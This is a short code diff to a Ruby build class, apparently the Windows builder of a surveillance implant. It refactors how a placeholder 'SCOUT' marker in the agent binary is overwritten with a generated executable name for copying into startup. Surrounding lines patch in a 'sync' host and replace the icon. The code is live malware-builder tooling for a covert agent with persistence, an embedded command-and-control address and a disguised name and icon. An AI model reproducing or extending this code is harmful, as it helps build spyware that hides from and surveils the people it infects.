@@ -45,8 +45,6 @@ class BuildWindows < Build
           host = @factory.configs.first.sync_host
           raise "Sync host not found" unless host
           content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
-          # the filename of the final exec
-          content.binary_patch 'SCOUT'*4, scout_name(@factory.confkey)[:name].ljust(20, "\x00")
         rescue
           raise "Sync marker not found"
         end
@@ -385,6 +383,16 @@ class BuildWindows < Build
       else
         info = scout_name(seed)
         icon_file = "icons/#{info[:name]}.ico"
+    end
+
+    # binary patch the name of the scout once copied in the startup
+    patch_file(:file => 'scout') do |content|
+      begin
+        # the filename of the final exec
+        content.binary_patch 'SCOUT'*4, info[:name].ljust(20, "\x00")
+      rescue
+        raise "Scout name marker not found"
+      end
     end
 
     # change the icon
